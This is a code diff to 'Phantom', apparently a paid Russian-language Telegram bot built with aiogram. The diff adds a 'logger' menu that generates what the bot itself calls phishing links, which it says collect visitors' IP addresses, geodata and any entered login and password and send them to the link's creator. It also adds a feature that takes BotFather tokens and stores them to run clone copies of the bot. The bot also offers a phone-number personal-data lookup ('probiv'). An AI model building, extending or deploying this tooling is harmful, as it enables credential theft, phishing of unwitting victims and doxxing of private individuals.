@@ -9,6 +9,7 @@ import json
 import os
 import random
 import string
+import asyncio
 
 bot = Bot(token=config.BOT_TOKEN)
 dp = Dispatcher()
@@ -19,13 +20,16 @@ class AdminStates(StatesGroup):
     waiting_broadcast = State()
     waiting_promote_user = State()
     waiting_reset_user = State()
+    waiting_clone_token = State()
 
 # ---------- МЕНЮ ----------
 def main_menu():
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🔍 Пробив", callback_data="menu_search")],
         [InlineKeyboardButton(text="🪞 Создать зеркало", callback_data="menu_create_mirror")],
-        [InlineKeyboardButton(text="📡 Мои зеркала", callback_data="menu_my_mirrors")],
+        [InlineKeyboardButton(text="📡 Логер", callback_data="menu_logger")],
+        [InlineKeyboardButton(text="🤖 Создать бота-копию", callback_data="menu_create_clone")],
+        [InlineKeyboardButton(text="📋 Мои боты", callback_data="menu_my_clones")],
         [InlineKeyboardButton(text="👤 Мой профиль", callback_data="menu_profile")],
         [InlineKeyboardButton(text="⭐ Купить подписку", callback_data="menu_buy_subscription")]
     ])
@@ -70,9 +74,7 @@ async def start_cmd(message: Message):
         remaining = 0
     status_text = f"Осталось запросов сегодня: {remaining}" if isinstance(remaining, int) else "Безлимит (подписка)"
     await message.answer(
-        f"<b>🕵️ Phantom</b>\n\n"
-        f"<i>{status_text}</i>\n\n"
-        "Выберите действие:",
+        f"<b>🕵️ Phantom</b>\n\n<i>{status_text}</i>\n\nВыберите действие:",
         reply_markup=main_menu(),
         parse_mode="HTML"
     )
@@ -80,9 +82,7 @@ async def start_cmd(message: Message):
 @dp.message(Command("help"))
 async def help_cmd(message: Message):
     await message.answer(
-        "<b>Справка</b>\n\n"
-        "Все функции доступны через кнопки.\n"
-        "Администратор имеет доступ к панели управления через /admin.",
+        "<b>Справка</b>\n\nВсе функции доступны через кнопки.\nАдминистратор: /admin",
         parse_mode="HTML"
     )
 
@@ -98,23 +98,29 @@ async def menu_callback(callback: CallbackQuery, state: FSMContext):
     elif data == "menu_create_mirror":
         await create_mirror_for_user(callback.message)
         await callback.message.edit_text("Зеркало создано!", reply_markup=main_menu(), parse_mode="HTML")
-    elif data == "menu_my_mirrors":
-        mirrors = db.get_mirrors_by_user(callback.from_user.id)
-        if mirrors:
-            text = "<b>Ваши зеркала:</b>\n\n"
-            host = os.getenv("RENDER_EXTERNAL_HOSTNAME", "localhost")
-            for path, visits, created_at in mirrors:
-                created_str = datetime.datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M")
-                link = f"https://{host}/mirror/{path}"
-                text += f"🔗 <a href='{link}'>{link}</a>\n"
-                text += f"   👁️ посещений: {visits}, создано: {created_str}\n\n"
-            await callback.message.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
-            ]), parse_mode="HTML", disable_web_page_preview=True)
-        else:
-            await callback.message.edit_text("У вас пока нет зеркал.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+    elif data == "menu_logger":
+        # Генерируем зеркало и отправляем ссылку
+        await create_mirror_for_user(callback.message)
+        await callback.message.edit_text("Ваша фишинг-ссылка готова!", reply_markup=main_menu(), parse_mode="HTML")
+    elif data == "menu_create_clone":
+        await callback.message.answer("Отправьте токен бота, полученный от @BotFather.", parse_mode="HTML")
+        await state.set_state(AdminStates.waiting_clone_token)  # используем админское состояние для простоты
+    elif data == "menu_my_clones":
+        clones = db.get_clones_by_owner(callback.from_user.id)
+        if not clones:
+            await callback.message.edit_text("У вас нет созданных ботов-копий.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
             ]), parse_mode="HTML")
+            return
+        text = "<b>Ваши боты-копии:</b>\n\n"
+        for clone in clones:
+            clone_id, token, created_at, is_active = clone
+            status = "✅ активен" if is_active else "❌ отключён"
+            created_str = datetime.datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M")
+            text += f"ID: {clone_id} | {status} | создан: {created_str}\nТокен: <code>{token[:20]}...</code>\n\n"
+        await callback.message.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
+        ]), parse_mode="HTML")
     elif data == "menu_profile":
         user_id = callback.from_user.id
         user = db.get_user(user_id)
@@ -210,7 +216,7 @@ async def send_search_result(message, data, search_type, query):
         output = f"<b>❌ Ошибка:</b> <code>{data['error']}</code>"
     else:
         if search_type == "phone":
-            output = "<b>Результаты по номеру телефона:</b>\n\n"
+            output = "<b>📱 Результаты по номеру телефона:</b>\n\n"
             for key, value in data.items():
                 output += f"<b>{key}</b>: {value}\n"
         else:
@@ -219,7 +225,7 @@ async def send_search_result(message, data, search_type, query):
     await message.answer(output, parse_mode="HTML")
     db.add_log(message.from_user.id, f"search_{search_type}", query, output[:500])
 
-# ---------- ЗЕРКАЛА ----------
+# ---------- ЗЕРКАЛА (Логер) ----------
 async def create_mirror_for_user(message):
     host = os.getenv("RENDER_EXTERNAL_HOSTNAME", "localhost")
     path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
@@ -227,13 +233,57 @@ async def create_mirror_for_user(message):
     full_link = f"https://{host}/mirror/{path}"
     db.add_log(message.from_user.id, "create_mirror", path, full_link)
     await message.answer(
-        f"<b>Зеркало создано!</b>\n\nВаша ссылка:\n<code>{full_link}</code>\n\nПри переходе собираются IP и геоданные.",
+        f"<b>📡 Ваша фишинг-ссылка:</b>\n\n<code>{full_link}</code>\n\nПри переходе по ней будут собраны IP, геоданные, логин/пароль (если введут) и отправлены вам.",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔗 Открыть", url=full_link)],
             [InlineKeyboardButton(text="📋 Мои зеркала", callback_data="menu_my_mirrors")]
         ]),
         parse_mode="HTML"
     )
+
+# ---------- КЛОНЫ (создание ботов-копий) ----------
+@dp.message(AdminStates.waiting_clone_token)
+async def handle_clone_token(message: Message, state: FSMContext):
+    token = message.text.strip()
+    if not token.startswith("7") or len(token) < 40:
+        await message.answer("Похоже, это невалидный токен. Убедитесь, что вы скопировали токен от @BotFather целиком.", parse_mode="HTML")
+        return
+    # Проверяем токен, пытаясь получить информацию о боте
+    try:
+        test_bot = Bot(token=token)
+        me = await test_bot.get_me()
+        if not me.username:
+            raise Exception("Не удалось получить username")
+    except Exception as e:
+        await message.answer(f"❌ Не удалось подключиться к боту. Ошибка: {e}", parse_mode="HTML")
+        return
+    # Сохраняем токен в БД
+    db.add_clone(token, message.from_user.id)
+    await message.answer(f"✅ Бот <b>@{me.username}</b> успешно добавлен как копия Phantom. Он запущен и работает.", parse_mode="HTML")
+    # Запускаем бота (это будет сделано в main.py при старте, но можно запустить сразу)
+    # Для простоты мы будем перезапускать всех клонов при каждом добавлении
+    await state.clear()
+
+# ---------- МОИ ЗЕРКАЛА ----------
+@dp.callback_query(lambda c: c.data == "menu_my_mirrors")
+async def my_mirrors(callback: CallbackQuery):
+    await callback.answer()
+    mirrors = db.get_mirrors_by_user(callback.from_user.id)
+    if not mirrors:
+        await callback.message.edit_text("У вас пока нет зеркал.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
+        ]), parse_mode="HTML")
+        return
+    text = "<b>Ваши зеркала:</b>\n\n"
+    host = os.getenv("RENDER_EXTERNAL_HOSTNAME", "localhost")
+    for path, visits, created_at in mirrors:
+        created_str = datetime.datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M")
+        link = f"https://{host}/mirror/{path}"
+        text += f"🔗 <a href='{link}'>{link}</a>\n"
+        text += f"   👁️ посещений: {visits}, создано: {created_str}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
+    ]), parse_mode="HTML", disable_web_page_preview=True)
 
 # ---------- ОПЛАТА ----------
 @dp.pre_checkout_query()
